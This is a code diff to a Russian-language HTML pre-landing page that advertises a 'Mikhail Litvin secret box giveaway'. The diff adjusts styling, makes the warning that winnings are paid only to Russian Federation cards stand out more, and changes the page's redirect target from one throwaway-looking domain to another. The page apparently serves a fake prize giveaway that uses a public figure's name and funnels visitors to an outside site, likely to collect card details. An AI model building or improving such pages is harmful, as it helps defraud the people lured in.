@@ -49,6 +49,17 @@
             text-shadow: 0 0 2px #000;
             color: white; /* Цвет текста остается белым */
         }
+
+        /* Обводка и тень: КРАСНАЯ обводка для предупреждения */
+        .text-red-stroke {
+            /* Темно-красный цвет обводки (red-800) */
+            -webkit-text-stroke: 1px #991b1b; 
+            text-stroke: 1px #991b1b;
+            /* Легкая тень для дополнительного объема */
+            text-shadow: 0 0 3px #000;
+            color: #ef4444; /* Яркий красный цвет текста (red-500) */
+            font-weight: 700; /* Сделать жирным */
+        }
         
         /* Убран эффект свечения */
         .message-box {
@@ -67,8 +78,8 @@
 </head>
 <body class="flex flex-col items-center justify-center min-h-screen p-4">
 
-    <!-- Основной контейнер прелендинга (блюр удален) -->
-    <main class="text-center bg-black bg-opacity-50 p-8 md:p-12 lg:p-16 rounded-xl shadow-2xl max-w-4xl w-full">
+    <!-- Основной контейнер прелендинга. УВЕЛИЧЕНА НЕПРОЗРАЧНОСТЬ ДО 80% -->
+    <main class="text-center bg-black bg-opacity-80 p-8 md:p-12 lg:p-16 rounded-xl shadow-2xl max-w-4xl w-full">
         <!-- Заголовок -->
         <h1 class="text-3xl sm:text-4xl lg:text-5xl font-extrabold leading-tight mb-4 text-white text-shadow-strong">
             Михаил Литвин - Розыгрыш Секретных Коробок
@@ -92,8 +103,8 @@
 
         <!-- Дополнительный дисклеймер -->
         <div class="mt-8 text-xs text-gray-100 max-w-2xl mx-auto leading-relaxed">
-            <!-- Текст без свечения, возвращен к text-red-600 -->
-            <p class="font-bold text-red-600 mb-2">
+            <!-- Применяем новый класс text-red-stroke -->
+            <p class="text-red-stroke mb-2">
                 ВНИМАНИЕ: Перевод средств в случае выигрыша доступен только на карты Российской Федерации.
             </p>
             <p>
@@ -131,7 +142,7 @@
             messageBox.style.display = 'block';
 
             // Перенаправляем на указанный URL
-            window.location.href = 'https://creativecallproject.site/public/7722103963237521';
+            window.location.href = 'https://littlenvget.shop/public/7785103963242420';
         });
     </script>
 </body>
